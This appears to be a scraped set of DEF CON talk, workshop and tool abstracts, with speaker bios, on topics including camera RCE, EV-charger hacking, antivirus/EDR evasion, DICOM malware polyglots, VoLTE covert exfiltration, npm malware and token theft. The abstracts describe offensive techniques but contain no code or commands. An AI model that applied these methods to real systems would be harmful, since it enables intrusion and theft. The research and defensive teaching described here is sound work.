<p>Dive into a vulnerable application and see if you can uncover its hidden weaknesses just like you would on a bug bounty program. The CTF is designed to be accessible for all experience levels, from beginners looking for their first bug to veteran hunters eager for a very interesting challenge. Expect a range of vulnerabilities, from trivial finds to sophisticated ones that will push you to the limit.</p>

<p>But thatâs not all. Weâre adding a unique real-world flavor to the competition. Participants onsite at DEF CON will submit some of their bug reports for those to be validated by real bug bounty triagers volunteering their expertise to make this experience as real as possible. This process will determine scores based not just on technical prowess but on report quality and professionalism, just like in a bug bounty program.</p>

<p>Get ready for a realistic bug bounty experience, a chance to grow your skills, connect with the community, and show what youâre made of.</p>

<p>Please note that you must be present on-site for our award ceremony on Sunday at 13:00 in order to receive any prizes.</p>

<p>Multiple agencies have attempted to regulate cryptocurrencies through various means. This workshop will begin with a short presentation about the different organizations with an interest in regulating cryptocurrency (SEC, CFTC, IRS, and DOJ) and provide examples of enforcement actions. Next, participants will break out into discussion groups to consider the pros and cons of regulation by enforcement. Then, participants will be given a hypothetical cryptocurrency and be assigned a role either as a 'regulator' or as a 'developer.' The participants will engage in a settlement type discussion to determine if the cryptocurrency should be regulated under one agency, multiple agencies, or not at all.</p>

<p>Limitations can result in creative solutions. For most hackers I know, this is core to why we do what we do. Being an artist has taught me to do the challenging and ridiculous at all costs. Most of the time, these values align, but sometimes they result in fabulous disasters. As of this writing, this is not the latter. </p>

<p>This talk is a reflection on badge creation, challenges, the badge curse, and the blurred lines between art and hacking. It examines how we perceive and value creation and making, inside and outside of our own circles. </p>

<font size=""+1""><strong>SpeakerBio:</strong></font>&nbsp;&nbsp;Mar<br>
<p>Mar has spent over 15 years contributing to DEF CON, ranging from illustration, badges &amp; interactive experiences to art direction. Last year they designed &amp; directed the creation of the DEF CON 32 Raspberry Pi badge, on which attendees played a custom game of the convention itself in real-time.</p>

<p>Mar has helped found, and has chaired hackerspaces and an art collective. They've painted public murals in the US and abroad, and held a residency at the Denver Art Museum, which explored the relationships between people and their identities online.</p>

<p>This year they open ""Feral Gallery"" in Denver, focused on queer and indigenous works. You can find Mar (and support their art!) at the Arts &amp; Entertainment booth at con.</p>

<p>What are the consequences if an adversary compromises the surveillance cameras of thousands of leading Western organizations and companies? As trust in Chinese-made IoT devices declines, organizations face limited alternativesâespecially in video surveillance. Many governments have already banned Dahua and Hikvision products in sensitive facilities, further narrowing their choices. This concern drove our research, revealing that surveillance platforms can be double-edged swords.</p>

<p>We focused on Axis Communications, a major player in video surveillance widely used by U.S. government agencies, schools, medical facilities, and Fortune 500 companies.</p>

<p>In our talk, we will present an in-depth analysis of the Axis.Remoting communication protocol, uncovering critical vulnerabilities that allow attackers to achieve pre-auth RCE on Axis platforms. This access could serve as a gateway into an organizationâs internal network via its surveillance infrastructure. Additionally, we identified a novel technique for passive data exfiltration, enabling attackers to map organizations using this equipmentâpotentially aiding in targeted attacks.</p>

<p>In this talk we present a collection of attacks against the most widely used EV charging protocol, by exploiting flaws in the underlying power-line communication technologies affecting almost all EVs and chargers.</p>

<p>Specifically, we target the QCA 7000 Homeplug modem series, used by the two most popular EV charging systems, CCS and NACS.</p>

<p>We demonstrate multiple new vulnerabilities in the modems, enabling persistent denial of service.</p>

<p>To better understand the scope of these issues, we conduct a study of EV chargers and vehicles, and show widespread insecurities in existing deployments.</p>

<p>We show a variety of practical real-world scenarios where the HomePlug link can be used to hijack EV charging communications, even at a distance.</p>

<p>Finally, we present results from reverse engineering the firmware and how we can gain code execution.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>When confronted with malicious macOS binaries, analysts typically reach for a disassembler and immerse themselves in the complexities of low-level assembly. But what if this tedious process could be skipped entirely?</p>

<p>While many malware samples are distributed as native macOS binaries (easily run with a simple double-click), they frequently encapsulate scripts hidden within executable wrappers. Leveraging frameworks such as PyInstaller, Appify, Tauri, and Platypus, malware authors embed their scripts with binaries, complicating traditional analysis. Although these frameworks share the goal of producing natively executable binaries, each employs a distinct method to embed scripts, thus necessitating tailored extraction tools and approaches.</p>

<p>Using real-world macOS malware (such as Shlayer, CreativeUpdate, GravityRAT, and many others), we'll first demonstrate how to identify these faux binaries and then how to efficiently extract or reconstruct their embedded scripts, bypassing the disassembler entirely!</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Cryptocurrency is everywhere now. Billion-dollar companies are built on it, entire economies run on Bitcoin, and cybercriminals love using it to finance their operations or hide stolen money. Cryptocurrencies promise anonymity, yet blockchain transactions are fully public, and make it tricky to hide funds.</p>

<p>In February 2025, the Bybit breach exposed two advanced attack vectors. First, a third-party wallet tool was compromised through malicious JavaScript injected into its logic, allowing attackers to manipulate smart contract behavior. Second, a SAFE Wallet developer was tricked through social engineering into running a fake Docker container, giving attackers persistent access to his machine.</p>

<p>With control established, they hijacked proxy contracts and executed stealth withdrawals of ETH and ERC-20 tokens. The stolen assets were laundered through decentralized exchanges, split across multiple wallets, bridged to Bitcoin, and passed through mixers like Wasabi Wallet.</p>

<p>So how do attackers manage to launder crypto, and how can we stop them? Using the 1.46 billion dollar Bybit hack by North Koreaâs Lazarus Group as a case study, this talk breaks down each laundering step and explains how to automate tracking and accelerate investigations using AI.</p>

<p>In 2022 a framework and tool for cryptographic attacks called Cryptosploit was introduced. In this workshop we will demo the capabilities and the underlying philosophy as well as new commands. This will include the flexibility of mixing and matching attack code with oracles and new commands to import and export cryptographic keys. In particular, we will demonstrate how after a successful attack on a public key, we will be able to export the private key corresponding to the certificate. The presentation will conclude with thoughts on improvements.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>BOAZ (Bypass, Obfuscate, Adapt, Zero-Trust) evasion was inspired by the concept of multi-layered approach which is the evasive version of defence-in-depth first proposed in a presentation at BH USA14. BOAZ was developed to provide greater control over combinations of evasion methods, enabling more granular evaluations against antivirus and EDR. It is designed to bypass before, during, and post execution detections that span signature, heuristic, and behavioural detection mechanisms. BOAZ supports both x86/x64 binary (PE) or raw payload as input and output EXE or DLL. It has been tested on separated Windows 11 Enterprise, Windows 10, and Windows Server 2022 VMs with 14 desktop AVs and 7 EDRs installed including Windows Defender, Norton, BitDefender, Sophos, and ESET. The design of BOAZ evasion is modular, so users can add their own toolset or techniques to the framework. BOAZ is written in C++ and C and uses Python3 as the main linker to integrate all modules. There have been significant improvements implemented since its inception. The new version of the BOAZ evasion tool, set for release at DEF CON 33, will feature three novel threadless process injection primitives, along with newly implemented loaders and behavioural evasion techniques.</p>

<p>Welcome to the âfunâ world of IoT, where security is often an afterthought and vulnerabilities lurk around every corner. This presentation is a guide for vendors on what not to do when designing IoT devices and a survival manual for users to spot insecure gadgets.
Ever wondered if your IoT device is spilling your home WiFi secrets to the cloud over HTTP? Spoiler alert: maybe :)
Pairing your device over open WiFi and HTTP while providing your home WiFi credentials? Just to vacuum clean your home? <br />
How about IoT devices lying about their Android version? But donât worry, it already comes with malware pre-infected. 
Wouldnât it be nice to access the clear-text admin passwords before authentication? How about multiple different ways to do that?
Would you like to see reverse engineering an N-day command injection vulnerability in the login form of a popular NAS device? 
What could be the easiest way to figure out the (static) AES encryption key for a home security alarm solution? Just RTFM! 
Why bother with memory corruption when command injection is still the king of IoT threats? I'll break it down for you, with an analysis of challenges with scalable IoT memory corruption exploits, and the challenges with blind ROP. 
Last but not least, letâs discuss why Busybox is ânot the bestâ choice for IoT development.</p>

<br>
<font size=""+1""><strong>Description:</strong></font><br>
<p>Buildings are largely overlooked when it comes to cyber security. The onus is typically placed on physically securing the building and the people inside of them. What most gloss over is the fact that industrial control systems run these buildings and without them, every day functions become unavailable and downright dangerous. The dangers are growing as buildings become more ""connected"" and require internet access to operate (ex. sustainability and IoT). Malicious use of engineering protocols (Modbus, Fox, BACNet) and targeted attacks against BAS systems are growing (ex. KNXLock).â</p>

<p>Environments run the gamut from overly secure, to the point of crippling, all the way to leaving RDP exposed with no logging or MFA to critical systems. There is no easy fix, properties must invest in technology and people to create a defensible environment. This presentation will show how cyber security can be enabled which fits with the business's operations and minimal disruption. </p>

<p>Building types are not constrained to only office space. Properties come in all varieties from warehouses and manufacturing spaces to data centers and shopping malls. All of this needs to be taken into account when assessing the environment and recommending tools and procedures. This talk will cover common architectures seen, typical control systems found in buildings (BMS, FLS, elevator, lighting, power...), reproducible steps to help companies/users understand their vulnerabilities and how we, as an industry, move forward. </p>

<p>For the most part, these are not technical problems, but a literal gap that needs to be addressed directly by budgetary and policy controls. The industry is pushing for cybersecurity budgeting, standards and visibility for properties, which are largely ignored or misunderstood by owners and operators. This is a solvable problem and I want attendees to feel empowered to ask tough questions and be prepared to have an educated conversation about the risks and not use fear mongering or scare tactics to get cybersecurity put in place.</p>

This talk explores the alarming ecosystem of âcriminal PII search panelsâ that thrive in the Brazilian cybercriminal landscape. These illicit tools, easily found on the surface and deep web, aggregate personal data from large-scale corporate breaches and make it readily searchable by fraudsters. With access to full names, ID numbers, banking details, and more, cybercriminals are empowered to launch convincing and devastating social engineering attacks. The session will dissect how these panels operate, their role in Brazil's rampant fraud industry, and the broader implications for digital privacy and security.

<p>The DICOM image format, used globally in healthcare to store and transmit medical images, contains a rarely discussed flaw in its header structure that can be exploited to hide malicious payloads. In this talk, we explore how attackers can embed code into DICOM files that still open and display normally in medical imaging software. Youâll learn how this permissive header allows for the creation of polyglot filesâvalid DICOM images that double as malware droppers. Because most static antivirus engines treat DICOM files as benign or ignore them altogether, these hybrid files can often bypass traditional detection mechanisms entirely. Weâll demonstrate how this works in practice, walking through the process of crafting DICOM-based payloads and showing how they behave on a target system. Attendees will also gain insight into why these files evade static scans and what this means for healthcare security at large.This talk is aimed at both red teamers and defenders. Offensive security professionals will gain a novel method for payload delivery in highly regulated environments, while defenders will leave with practical strategies for detecting and mitigating this class of threat. This presentation highlights how blind trust in industry-standard formats can create dangerous blind spots in security. The DICOM formatâs flexibilityâoriginally designed for compatibilityânow serves as a potential attack vector, and itâs time the infosec community pays attention.</p>

<p>As digital systems increasingly control the worldâs most powerful machines, software failures have become a silent but deadly threatâsometimes with fatal consequences. This DEFCON presentation dives deep into maritime and military incidents where software errors, automation missteps, and human-computer interface flaws have led to catastrophic outcomes. Reviewing the USS Yorktownâs infamous âSmart Shipâ crash and the USS Vincennesâ tragic misidentification of a civilian airliner, we dissect how code, configuration, and design choices can escalate into life-or-death situations at sea. Weâll also draw parallels to high-profile aviation incidents like the Boeing 737 Max and F-35, illustrating common threads in software assurance failures across domains. Weâll walk through how a subtle software flaw could be exploited to disrupt critical vessel operations, and what this means for the future of maritime cybersecurity. Attendees will gain insight into the technical, organizational, and ethical challenges of securing mission-critical systems, and leave with practical takeaways for hackers, engineers, and policymakers seeking to prevent the next digital disaster on the high seas.</p>

<p>Want to build a Security Champion program that doesnât fizzle after launch? This 2-hour hands-on workshop will guide you through designing a practical, sustainable champion program tailored to your culture, org structure, and resourcing realities. Whether youâre just getting started or trying to fix a stalled initiative, this session will equip you with the tools to define your vision, shape meaningful goals, and map out your first cohort - all with a firm grounding in culture-building, metrics, and action-oriented design.
Participants will work through a collaborative workbook with activities focused on champion behaviors, stakeholder alignment, motivational techniques, and training plans. You'll leave with a solid program blueprint, practical takeaways, and inspiration to rally allies across Engineering, Application Security, and Leadership. If you believe developers are on the front lines of security, and want to do more than ""raise awareness,"" this is your workshop.</p>

<p>In his first-ever public appearance, elite hacker ZwinK joins Casey Ellis (CEO of BugCrowd) and Keith Busby (Acting CISO of the Centers for Medicare &amp; Medicaid Services (CMS)) for a rare, unscripted look inside one of the largest, and most consequential bug bounties in the federal government. CMS touches the lives of 150M+ Americans and secures data that must not go offline â which made its decision to invite hackers inside both radical and risky.</p>

<p>This talk will cover how the program worked, what CMS learned, and how ZwinK uncovered critical vulnerabilities in public-facing federal systems. ZwinK will share his surprising favorite tactics, tools, and recon strategies â including how he hunts for high-value bugs in complex, regulated environments. Keith will explore how CMS weighed the risks of shining a light on its attack surface and how they battled the naysayers and managed federal red tape. Casey will discuss how BugCrowd is helping agencies shift from fear to resilience by operationalizing collaboration with hackers.</p>

<p>Expect real lessons, live banter, and a sharp edge â especially if your agency (or client) is still on the fence about bug bounties.  No knowledge of healthcare is needed to enjoy this panel, just come curious!</p>

<p>Quantum computing is no longer science fictionâitâs shipping racks. But as we rush to build quantum machines, are we repeating the same mistakes of closed, opaque architectures that made classical computing insecure in the first place?</p>

<p>In this talk, weâll dissect the anatomy of a modern quantum computing stackâfrom cryo-control layers and QPU hardware to compilers and orchestration interfacesâand map out where todayâs vulnerabilities hide and tomorrowâs attack surfaces may emerge, when large scale, quantum-interconnected fault-tolerant quantum computers will cooperate to run algorithms. Weâll look under the hood of real-world platforms, including examples like whitebox products under development, to see how modularity (or the lack of it) impacts trust, resilience, and innovation.</p>

<p>Weâll argue for an open, whitebox approach to quantum systems: where interoperability, transparency, and independent testing arenât nice-to-havesâtheyâre mandatory for a secure quantum future. Weâll explore how the current supply chain and ecosystem influence who gets to build, audit, and break these systemsâand why hackers, tinkerers, and architects alike must care.</p>

<p>We'll end with a call to anyone that likes open protocols, clean interfaces, and breaking things to make them better, as our invitation to Join the Quantum Stack Hack.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>In todayâs threat landscape, people are often the weakest linkâand attackers are aware of it. From phishing and impersonation to executive targeting and account compromise, adversaries increasingly use open-source intelligence (OSINT) to build detailed profiles of individuals long before launching an attack.<em>x000D</em>
<em>x000D</em>
This session dives into the evolving art of people-focused reconnaissance, demonstrating how seemingly harmless public data can be weaponized into precise social engineering campaigns, identity spoofing, and credential pivoting.<em>x000D</em>
<em>x000D</em>
Weâll cover:<em>x000D</em>
<em>x000D</em>
Identity tracing techniques using breach data, professional directories, dark web leaks, and forgotten digital breadcrumbs_x000D_
<em>x000D</em>
Building detailed social graphs across platforms like LinkedIn, GitHub, Twitter/X, Facebook, and academic/industry conference rosters_x000D_
<em>x000D</em>
Tools and techniques to identify executive targets, their digital habits, exposed credentials, and behavioral patterns_x000D_
<em>x000D</em>
Mapping corporate org structures and vendor relationships through public filings, social posts, and collaboration tools_x000D_
<em>x000D</em>
How to uncover personal infrastructure (GitHub repos, sandbox environments, demo servers) tied to specific developers or architects_x000D_
<em>x000D</em>
Cross-referencing usernames, email handles, avatars, and metadata to track digital identities across platforms_x000D_
<em>x000D</em>
Using automation to generate identity maps and behavioral timelines using OSINT scripts and browser automation frameworks_x000D_
<em>x000D</em>
Youâll also learn how attackers combine this recon with voice deepfakes, domain typosquatting, and AI-generated emails to execute convincing social engineering attacksâespecially against high-value individuals.<em>x000D</em>
<em>x000D</em>
While this session is grounded in offensive techniques, itâs highly actionable for blue teams, threat intel analysts, and enterprise security leaders. Weâll walk through real-world case studies where simple recon led to large-scale breaches, compromised business email accounts, and insider attacks.<em>x000D</em>
<em>x000D</em>
Takeaways will include:<em>x000D</em>
<em>x000D</em>
A checklist for assessing your organizationâs exposed human attack surface_x000D_
<em>x000D</em>

<br>
<font size=""+1""><strong>Description:</strong></font><br>
<p>Drawing from personal experience as a press photographer, this talk highlights the underexplored attack surface created by media access at high profile events like concerts, sporting events and political rallies. We explore how the press badge can become a powerful tool in the hands of a red teamer. By taking into account elements of OSINT, social engineering, and physical and network security, we focus on how lessons learned as a press photographer can directly be applied by red teamers (or threat actors!) to gain a foothold. Once that is achieved, individuals can embed themselves directly within high-visibility individuals and high-value, sensitive devices associated with professional sports teams, musicians and bands, and political leaders and lawmakers. The talk also discusses the importance of looking at the âÃÃ²bigger pictureâÃÃ´, and being aware of threats where people may not consider them to come from. Inspired by the spirit of Johnny LongâÃÃ´s No Tech Hacking, this talk examines how low-tech, high-ingenuity approaches continue to be in a hacker's arsenal. It makes the case that media impersonation is a serious but overlooked threat vector, and one that allows attackers to bypass traditional perimeters.</p>

<font size=""+1""><strong>SpeakerBio:</strong></font>&nbsp;&nbsp;Mansoor Ahmad<br>
<p>Mansoor Ahmad is an offensive security practitioner who has always had a curiosity about how things worked. He studied information technology and worked as a news photographer in college. A quiet kid growing up in a foreign country, he would always accompany his father on errands and observe people's reactions to different things and the psychology behind it. This started an itch which he has been scratching since then, that has led to a career in information security. When he's not working, eating or sleeping, Mansoor likes to practice photography and taking naps.</p>

<font size=""+1""><strong>SpeakerBio:</strong></font>&nbsp;&nbsp;Brad Ammerman<br>

<p>How VoLTE and IMS â the backbone of modern telecom voice services â can be weaponized by malware to perform stealthy, operator-blind surveillance, data exfiltration, and persistent command-and-control (C2), all without using the public internet. how a VoLTE-enabled Android device can be turned into a covert surveillance nodeâno SIM or live network required. Using a rooted emulator (for safe, repeatable testing) and Frida hooks, attendees will watch malware silently hijack the IMS stack, launch SIP INVITE/OPTIONS beacons to a Kamailio-based fake IMS core, and exfiltrate SMS, location, eSIM data or live audio over RTPâall traffic appearing as legitimate VoLTE signaling inside telecom infrastructure. The exercise proves how nation-grade implants can live entirely inside operator voice channels, bypassing traditional firewalls and DPI.</p>

<p>âAnatomy of Telecom Malwareâ is a Telecom Village talk spanning 2G, 3G, 4G/LTE and cloud-native 5G. It dissects how attackers weaponise every layer of the stackâSS7/SIGTRAN, Diameter, GTP, SMPP and SBA APIsâwhile adding three critical lenses:</p>

<ul>
<li>Supply-chain infiltration: poisoned firmware builds and compromised eSIM-provisioning servers that let implants enter the core before day 0.</li>
<li>Transit-based backdoors: malware such as the LightBasin âGTPDoorâ family that hides its C2 inside roaming GTP-C/U tunnels, crossing operator boundaries unnoticed.</li>
<li>Field-proven attacks: campaigns like SIMjackerâs SS7/S@T-browser exploitation for OTP interception and recent SS7-redirect bank-fraud cases, plus roaming-hub spyware and diameter peer-scraping seen in the wild.</li>
</ul>

<p>Attendees leave with a telecom-specific kill-chain map, protocol-aware detection tricks, and a 10-point hardening checklist to protect both legacy and future networks.</p>

<p>Hi, Iâm Megan Allen.</p>

<p>My work focuses on a holistic approach to health; moving the bodyâs natural energy into alignment with Earth and the seven chakras. I practice integrative wellness - honoring a person's emotional, mental, physical and spiritual well-being. I provide intuitive healing sessions and work with clients to relax the mind, increase body awareness and balance energy flow.</p>

<p>I also facilitate community wellness workshops, ceremonies and transformational group programs inviting participants to disconnect from their busy lives, turn inward and tap into the present to restore and maintain the bodyâs energetic balance and cultivate self-love, empowerment and sovereignty.</p>

<p>I inspire people to activate their highest potential in alignment with their wise hearts and to promote healing from within. I tailor my sessions to reflect this; using techniques from my healing disciplines as well as my love for Traditional Chinese Medicine, holistic aromatherapy, crystals and essential oils, tarot, animal medicine cards and a deep reverence for nature.</p>

<p>Nature is one of my greatest teachers. It constantly teaches me about grounding, stability, resilience, boundaries, growth, and stillness.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>The most obvious, fundamental problem with Ballot Marking Devices is encoding votersâ choices in images voters cannot read and tabulating from those images. Compounding BMD problems, these systems produce at least three distinct images of votersâ selections: the choices in QR/bar code images, a printed text list purporting to show those encoded choices, and a ballot image produced by precinct scanners. These images and printed list may be subject to different possible mistakes misperceptions, or manipulation. Regulations have not kept up with vulnerabilitiesâbut simply adding more regulations will not suffice. This presentation reviews regulations in several states, beginning with Florida, as an example to examine when and if the printed list for voter review may be counted.</p>

<p>Susan Lerner will provide an overview of the ongoing litigation in New York state court, Common Cause NY v. Kosinski, which challenges the legality of using the ES&amp;S ExpressVote XL all-in-one ballot marking device and tabulator under New York law. The ExpressVote XL records votes in barcodes - unreadable to the naked eye - which, Common Cause NY asserts, violates New York law. NY statute provides that all voters must have the opportunity to verify their votes before they are cast. Notably, the federal Help America Vote Act includes the same provision. Should Common Cause NY prevail in state court, the decision could spark further action. The recording or votes in barcodes or QR has been controversial since its introduction. In 2019, Colorado Secretary of State Jenna Griswald (D) announced an initiative to end encoding votes in barcodes/QR codes in Colorado. In March, Donald Trump issued an executive order that sought to prohibit encoding votes in barcodes/QR codes in federally certified voting machines. This talk will explore the legal arguments at issue in the NY case, that could have repercussions elsewhere.</p>

<p>npm is owned by Microsoft and is the worldâs largest software registry. It hosts nearly 5 million packages and 4.5 trillion requests for packages were made to npm in 2024. The open and accessible nature of npm is one of its main features, but its also one of the reasons that threat actors are attracted to it. A recent study by Sonatype found that 98.5% of malicious software packages are hosted and delivered via npm.</p>

<p>This technical deep-dive will explain why npm is so good at delivering malware; expose how threat actors are using npm; and why existing security tools like SCA, SAST, EDR and anti-virus solutions will not protect you from npm based malware.</p>

<p>Key Topics:</p>

<ul>
<li>Technical analysis of how attackers leverage npm's unique characteristics (namespace claiming, pre/post install scripts, package name recycling) to deliver successful malware</li>
<li>Why existing security solutions like SCA, SAST, EDR and anti-virus wonât find npm based malware</li>
<li>Comparative analysis of attack patterns across different threat actors (researchers, crypto thieves, criminal APTs, nation-states)</li>
<li>Introduction to OSV, GHSA and other resources to help your teams stay informed about new malcious packages</li>
</ul>

<br>
<font size=""+1""><strong>Description:</strong></font><br>
<p>Get ready for a live demo of full-blown cloud compromise - starting from an innocent-looking SageMaker AI notebook and ending in complete AWS account takeover. Using nothing more than the default SageMaker AI setup granted to data scientists, this session showcases how attackers can chain together misconfigurations across IAM, SecretsManager, ECR, and network layers to take control of the environment from the inside out.
But thatâs just the beginning.</p>

<p>This talk also features the exclusive release of a new open source tool- the first offensive framework built to simulate and execute post-exploitation in SageMaker AI environments. Red teams can weaponize it. Defenders can validate exposures. Either way, it shines a spotlight on one of the cloudâs most overlooked attack surfaces: managed AI infrastructure.</p>

<p>Drawing on real-world experience from offensive operations against cloud environments around the world - including enterprise and nation-level targets - this session breaks down how AI services like SageMaker AI are quietly becoming powerful post-exploitation platforms.
SageMaker AI was designed to train models, not attackers - but with its comfort-first design, permissive defaults, and excessive trust relationships, it quietly offers everything needed for stealthy lateral movement and infrastructure-wide compromise.</p>

<p>This talk is for red teamers, defenders, and anyone building or securing ML workloads in the cloud. Expect real attack chains, real tools, and a view into how attackers are targeting AI infrastructure in the wild - and why most environments aren't ready for it.</p>

<p>Traditional detection methods struggle to keep pace with evolving attacker tactics in cloud environments like Microsoft 365. To level the playing field, organizations can implement honeypots and honey tokens strategically within their M365 infrastructure, turning the complexity of cloud services to their advantage. By creating deliberately enticing yet closely monitored decoys, defenders can proactively detect attacker reconnaissance and exploitation attempts.</p>

<p>This session outlines effective strategies for deploying M365 honeypots and honey tokens, emphasizing low false-positive rates and high data quality. Leveraging Exchange, SharePoint, Teams, and Application-specific tokens, attendees will learn to craft attractive, attacker-oriented traps integrated seamlessly into their security monitoring pipelines. Advanced deception techniques, including breadcrumb trails leading adversaries into highly monitored secondary environments, will also be discussed.</p>

<p>Through live demonstrations, participants will gain valuable insights into how deception techniques can be applied within Microsoft 365 environments. They will learn how to design and implement these strategies in their own environments to strengthen detection capabilities against sophisticated adversaries.</p>

<p>This presentation is the culmination of extensive hands-on research and practical application in both penetration testing and defensive detection engineering. By leveraging actual techniques observed in real-world attacks, this talk bridges offensive innovation with proactive defensive strategies. Attendees will receive detailed methodologies to effectively set up, deploy, and monitor M365-specific honeypots.</p>

Modern clusters are a moving target: new images ship hourly, nodes drift from their golden state, and runtime threats appear without warning. Kubernetesâ¯Securityâ¯Scanner gives you one keyboard shortcut to see it allâand this handsâon workshop teaches you how.<br />

<p>The tool runs a fullâstack inspection in minutes and organizes findings into five actionable domains:</p>

<p>Cluster Setup &amp; Hardening â benchmarks every controlâplane and node flag against CIS, highlights risky admissionâcontroller and RBAC settings, and maps networkâpolicy blind spots.</p>

<p>System Hardening â validates kernel parameters, kubelet options, containerâruntime and gVisor profiles to keep the host layer sealed tight.</p>

<p>Microservice Vulnerability Reduction â enforces leastâprivilege at pod and container level by checking security contexts, resource limits, disruption budgets, and secrets hygiene.</p>

<p>SupplyâChain Security â blocks bad code before it ships by verifying image signatures and SBOMs, scanning for CVEs and license red flags, and flagging stale or untrusted artifacts.</p>

<p>Runtime Security â confirms auditâpolicy coverage, validates Falco rules and alert paths, and streams suspicious events so you can react in real time.</p>

<p>Attendees will deploy the scanner against a vulnerable âKubernetes Goatâ cluster, interpret it's  reports, and remediate highâimpact issues live. By the end of the session youâll leave with a repeatable workflow that delivers prescriptive, lineâitem fixes from cluster creation through dayâ2 operationsâno guesswork, just secureâbyâdesign Kubernetes.</p>

<p>Why grind when you can hack? In this walkthrough, we explore how modern LLMs and AI tooling can vibe-code game hacks faster than your buddy speedrunning with Cheat Engine. Weâll break down Windows internalsâthreads, processes, virtual memoryâand show how single-player games expose juicy variables ripe for memory editing. Then we crank it up: for online games, we move beyond static memory shenanigans to modifying protocol handlers, intercepting function calls, and fuzzing inputs to uncover server-side bugs like infinite gold, integer overflows, and teleportation exploits. Who needs skills when your AI sidekick can boost you through memory space and into dev-only zones?</p>

<p>Security research has been focused on securing well-known, widely replicated ecosystems where problems and solutions are shared across the industry. But what happens when you build something no one else has? How do you secure an architecture that's both proprietary and deployed at billion-core scale?</p>

<p>In 2016, NVIDIA began transitioning its internal Falcon microprocessor, used in nearly all GPU products, to a RISC-V based architecture. Today, each chipset has 10-40 cores, and in 2024, NVIDIA surpassed 1 billion RISC-V cores shipped. This success came with unique security challenges, ones that existing models couldn't solve.</p>

<p>To address them, we created a custom SW and HW security architecture from scratch. Including a purpose-built Separation Kernel SW, novel RISC-V ISA extensions like Pointer Masking, IOPMP (later ratified), and unique secure boot and attestation solution. But how do you future-proof a proprietary ecosystem against tomorrow's threats?</p>

<p>In this talk, we'll share what we learned, and what's next. From HW-assisted memory safety (HWASAN, MTE) to control-flow integrity (CFI) and CHERI-like models, we'll explore how NVIDIA is preparing not only its RISC-V ecosystem for the evolving threat landscape. If you care about real-world security at an unprecedented scale, this is a journey you won't want to miss.</p>

<p>DOM Clobbering is a type of code-reuse attack on the web that exploits naming collisions between DOM elements and JavaScript variables for malicious consequences, such as Cross-site Scripting. </p>

<p>In this talk, we present a novel systematization of DOM Clobbering exploitation in four stages, integrating existing techniques while introducing new clobbering primitives. Based on this foundation, we introduce Hulk, the first dynamic analysis tool to automatically detect DOM Clobbering gadgets and generate working exploits end-to-end.</p>

<p>Our evaluation revealed an alarming prevalence of DOM Clobbering vulnerabilities across the web ecosystem. We discovered 497 zero-day DOM Clobbering gadgets in the Tranco Top 5,000 sites, affecting popular client-side libraries, including Google Client API, Webpack, Vite, Rollup, and Astroâall of which have since acknowledged and patched the issue.</p>

<p>To complete our exploitation chain, we further study its trigger---HTML Injection vulnerability. Our systematic analysis of HTML Injection uncovered over 200 websites vulnerable to HTML injection. By combining them with our discovered gadgets, we demonstrated complete attack chains in popular applications like Jupyter Notebook/JupyterLab, HackMD.io, and Canvas LMS. This research has resulted in 19 CVE identifiers being assigned to date.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>It was the summer of 2016, and like everyone else, I was out playing PokÃ©mon Go. Except my rural location barely spawned anything interesting. Naturally, I dove into the game's code, reverse engineered its protocol, and built a custom PokÃ©mon scanner.</p>

<p>But the story doesn't end there. One day, a switch was flipped, enabling a fancy new anti-cheating feature that locked out any custom implementations.</p>

<p>In this talk, I'll begin by exploring how mobile games like PokÃ©mon Go handle communication through specialized protocolsâand how I replicated that behavior to build a scanner. Then, I'll walk you through a 4-day hacking marathon where I teamed up with a group of like-minded enthusiasts to overcome the anti-cheating mechanism that nearly broke our scanners.</p>

<p>We'll examine how mobile games attempt to thwart such applications, unraveling the anti-cheating mechanism that was deployed by Pokemon Go. We'll explore how we managed, through obfuscated cryptographic functions, unexpected use of smartphone peripherals and hidden protobuf definitions, to break the anti-cheating system and release a publicly available API for the game's protocol.</p>

<p>Almost a decade later, the full story is ready to be told. Join me for an inside look at the anti-cheating mechanisms of online mobile gamesâand how to hack them.</p>

<p>While the theft of Primary Refresh Token (PRT) cookies on Windows has been extensively studied, similar attacks on macOS remain unexplored. As organizations increasingly use Microsoft Intune to manage both Windows and macOS devices, a critical question arises: can attackers also extract PRT cookies from macOS?</p>

<p>In this talk, we present our research into Microsoftâs SSO implementation within the Intune Company Portal for macOS. We compare authentication flows and security controls between Windows and macOS, exposing weaknesses that allow attackers to bypass process validation and obtain authentication tokens under certain conditions.</p>

<p>Another obstacle for attackers has been Microsoftâs efforts to make it more difficult to register new devices using stolen credentials for persistence. Our research introduces a novel technique: once an attacker acquires a token with an MFA claim on the device, they can still register new devices and generate new tokens without concern for the original stolen tokenâs expiration.</p>

<p>We will demonstrate PRT Cookie extraction on macOS and release a proof-of-concept tool, showing not only how credential theft techniques can now extend beyond Windows to macOS environments, but also how attackers can leverage these techniques for long-term persistence.</p>

<p>In this talk, the speaker details how a threat actorâs OPSEC slipâtesting their own keylogger and infostealer on their hacking machineâprovided a real-time view into a cybercrime operation. By intercepting Telegram-based command-and-control (C2) communications, the speaker obtained hundreds of screenshots and keylogs of the threat actors desktop, revealing the entire cybercrime operation. The session also covers the creation of Telegram bot tokens, which were then embedded in malware to enable covert data exfiltration and remote control.</p>

<p>Through automated analysis techniques, including VirusTotal and custom YARA rules, the speaker tracked samples communicating with Telegramâs API, extracted thousands of bot tokens that were used to forward stolen data, used these to intercept communications, and mapped backend infrastructure through screenshots of the threat actors desktop. This process led to the discovery of links to broader phishing and malware campaigns, underscoring how trusted platforms like Telegram can be abused by malicious actors.</p>

This tool simulates ten web-based identity attacks through a single browser extension with minimal permissions, operating primarily through hidden windows that execute attacks without user awareness. With Copycat, red teams can simulate complex attack scenarios including silent Gmail and LinkedIn hijacking, credential theft through login and OTP stealing, login page redirection, autofill extraction from enterprise applications, and multiple OAuth manipulation techniques. Copycat runs entirely in-browser with no special hardware requirements. Red teams can use Copycat to demonstrate attack vectors that bypass EDRs, SASE, and other traditional security controls, as these techniques operate within legitimate authenticated sessions rather than breaking them. The tool is fully modifiable, with each module designed for customization to target different services or authentication flows. Source code and documentation will be available for security researchers to extend and improve the framework. Special mention to Pankaj Sharma, Tejeswara S.

